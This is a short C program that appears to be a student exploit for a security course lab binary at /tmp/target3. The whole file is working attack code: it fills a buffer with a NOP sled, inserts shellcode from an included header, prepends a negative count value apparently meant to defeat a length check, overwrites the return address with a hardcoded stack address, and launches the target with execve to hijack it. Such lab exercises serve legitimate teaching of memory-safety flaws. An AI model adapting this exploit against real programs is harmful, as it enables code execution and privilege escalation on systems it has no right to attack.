#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP     0x90
#define LEN     45
#define HEADER  "-268435295,"
#define SIZE    2580 //2560+11+9

int main(void)
{
  int i;
  char *args[3];
  char *env[1];

  char buf[SIZE];
  memset(buf, NOP, SIZE);
  strncpy(buf, HEADER, 11);
  strncpy(buf+20, shellcode, LEN);
  //for(i = 0; i < 169; i++)
  //  printf("%x ", buf[i]);
  //printf("buf value is %x\n" , *buf);

  strncpy(buf+SIZE-5, "\xea\xf5\xff\xbf", 4);
  strncpy(buf+SIZE-1, "\0", 1);

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
